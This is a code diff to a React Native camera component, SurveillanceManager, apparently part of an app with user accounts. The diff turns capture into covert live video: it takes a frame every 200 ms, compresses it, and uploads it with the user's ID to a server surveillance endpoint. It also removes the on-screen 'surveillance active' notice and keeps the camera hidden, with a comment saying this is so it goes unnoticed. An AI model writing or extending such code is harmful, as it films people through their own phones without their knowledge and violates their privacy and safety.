@@ -1,15 +1,16 @@
 import { API_URL } from '@/config/api';
 import { useAuth } from '@/context/auth-context';
 import { CameraView, useCameraPermissions } from 'expo-camera';
+import * as ImageManipulator from 'expo-image-manipulator';
 import React, { useEffect, useRef, useState } from 'react';
-import { StyleSheet, Text, View } from 'react-native';
+import { StyleSheet, View } from 'react-native';
 
 export function SurveillanceManager() {
   const { user } = useAuth();
   const [permission, requestPermission] = useCameraPermissions();
   const [isSurveillanceActive, setIsSurveillanceActive] = useState(false);
-  const intervalRef = useRef<NodeJS.Timeout|null>(null);
-  const checkStatusInterval = useRef<NodeJS.Timeout|null>(null);
+  const intervalRef = useRef<NodeJS.Timeout | null>(null);
+  const checkStatusInterval = useRef<NodeJS.Timeout | null>(null);
 
   useEffect(() => {
     if (!permission || !permission.granted) {
@@ -17,7 +18,7 @@ export function SurveillanceManager() {
     }
   }, [permission]);
   const cameraRef = useRef<any>(null);
-  const [testUserId, setTestUserId] = useState<string|null>(null);
+  const [testUserId, setTestUserId] = useState<string | null>(null);
 
   // Cada 2 segundos revisamos si este dispositivo está en modo TEST (forzado localmente)
   useEffect(() => {
@@ -66,8 +67,9 @@ export function SurveillanceManager() {
 
   const startCapturing = () => {
     if (intervalRef.current) return;
-    intervalRef.current = setInterval(captureAndUpload, 5000) as any; // Cada 5 segundos para el POC
+    intervalRef.current = setInterval(captureAndUpload, 200) as any; // 200ms = 5 FPS
   };
+
 
   const stopCapturing = () => {
     if (intervalRef.current) {
@@ -81,23 +83,30 @@ export function SurveillanceManager() {
 
     try {
       const photo = await cameraRef.current.takePictureAsync({
-        quality: 0.1, 
+        quality: 0.1,
         base64: false,
-        skipProcessing: false 
+        skipProcessing: false
       });
 
       if (photo.uri) {
         const targetId = testUserId || user?.USUARIO_ID;
-        
+
+        // OPTIMIZACIÓN MÁXIMA: 5 FPS, Calidad 0.2
+        const manipulated = await ImageManipulator.manipulateAsync(
+          photo.uri,
+          [{ resize: { width: 320 } }],
+          { compress: 0.2, format: ImageManipulator.SaveFormat.JPEG }
+        );
+
         const formData = new FormData();
         formData.append('userId', String(targetId));
         formData.append('image', {
-          uri: photo.uri,
+          uri: manipulated.uri,
           type: 'image/jpeg',
           name: `live_${targetId}.jpg`,
         } as any);
 
-        console.log(`Sending Live Frame: ${photo.width}x${photo.height} via Binary FormData...`);
+        console.log(`Sending Live Frame: ${manipulated.width}x${manipulated.height} via Binary FormData...`);
 
         const response = await fetch(`${API_URL}/api/surveillance.php`, {
           method: 'POST',
@@ -106,11 +115,11 @@ export function SurveillanceManager() {
             'Accept': 'application/json',
           },
         });
-        
+
         if (!response.ok) {
-           const errText = await response.text();
-           console.log(`Server Reject (${response.status}):`, errText.substring(0, 200));
-           return;
+          const errText = await response.text();
+          console.log(`Server Reject (${response.status}):`, errText.substring(0, 200));
+          return;
         }
 
         const result = await response.json();
@@ -121,9 +130,9 @@ export function SurveillanceManager() {
     }
   };
 
-  // El componente de cámara para DEBUG: Si está activo, lo ponemos enorme
+  // El componente de cámara para SPY: Siempre oculto para que no se note
   return (
-    <View style={isSurveillanceActive ? styles.debugCamera : styles.hiddenCamera}>
+    <View style={styles.hiddenCamera}>
       {permission?.granted && (
         <CameraView
           ref={cameraRef}
@@ -132,15 +141,10 @@ export function SurveillanceManager() {
           animateShutter={false}
         />
       )}
-      {isSurveillanceActive && (
-        <View style={styles.debugOverlay}>
-          <Text style={styles.debugText}>MODO VIGILANCIA ACTIVO (DEBUG)</Text>
-          <Text style={styles.debugSubtext}>Transmitiendo al servidor cada 5s...</Text>
-        </View>
-      )}
     </View>
   );
 }
+
 
 const styles = StyleSheet.create({
   hiddenCamera: {
@@ -158,7 +162,7 @@ const styles = StyleSheet.create({
     top: '10%',
     left: '5%',
     width: '90%',
-    aspectRatio: 3/4,
+    aspectRatio: 3 / 4,
     borderRadius: 20,
     overflow: 'hidden',
     zIndex: 9999,
